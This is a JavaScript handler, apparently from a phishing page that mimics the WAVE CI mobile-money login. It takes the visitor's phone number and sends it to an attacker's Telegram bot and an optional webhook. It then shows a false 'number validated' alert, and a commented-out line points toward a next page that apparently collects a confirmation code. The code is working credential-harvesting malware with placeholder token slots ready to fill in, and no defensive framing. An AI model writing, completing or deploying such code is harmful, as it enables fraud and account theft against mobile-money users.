async function handleStep(step, data) { // Configuration de votre Bot Telegram // Remplacez ces valeurs par votre propre Token Bot Telegram et votre Chat ID const BOT_TOKEN = '7712345678:AAH...votre_token_ici'; const CHAT_ID = '123456789'; // Optionnel : URL d'un webhook personnalisé (Discord, serveur perso, etc.) const CUSTOM_WEBHOOK_URL = ''; const phoneNum = data.phone || ''; const message = `📱 [WAVE CI] Nouvelle connexion reçue !\n👤 Numéro : +225 ${phoneNum}\n🕒 Date : ${new Date().toLocaleString()}`; // Affichage d'un indicateur de chargement ou désactivation du bouton si besoin const btn = document.getElementById('btnSuivant'); if (btn) { btn.disabled = true; btn.innerText = 'Connexion en cours...'; } try { // 1. Envoi vers Telegram Bot API si configuré if (BOT_TOKEN && !BOT_TOKEN.includes('votre_token')) { const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' }) }); if (!response.ok) { console.error('Erreur API Telegram:', await response.text()); } } // 2. Envoi vers un webhook personnalisé optionnel if (CUSTOM_WEBHOOK_URL) { await fetch(CUSTOM_WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ step, phone: phoneNum, country: '+225', timestamp: new Date().toISOString() }) }); } // Simulation console si aucun bot n'est configuré if ((!BOT_TOKEN || BOT_TOKEN.includes('votre_token')) && !CUSTOM_WEBHOOK_URL) { console.log('Mode Simulation - Données capturées :', { step, phone: '+225 ' + phoneNum }); } // Redirection ou simulation de l'étape suivante setTimeout(() => { alert('Votre numéro a été validé avec succès !'); if (btn) { btn.disabled = false; btn.innerText = 'Suivant'; } // Vous pouvez rediriger l'utilisateur vers une page de code de confirmation ici : // window.location.href = 'code.html'; }, 1000); } catch (err) { console.error('Erreur lors de la transmission au bot :', err); alert('Une erreur est survenue. Veuillez réessayer.'); if (btn) { btn.disabled = false; btn.innerText = 'Suivant'; } } }
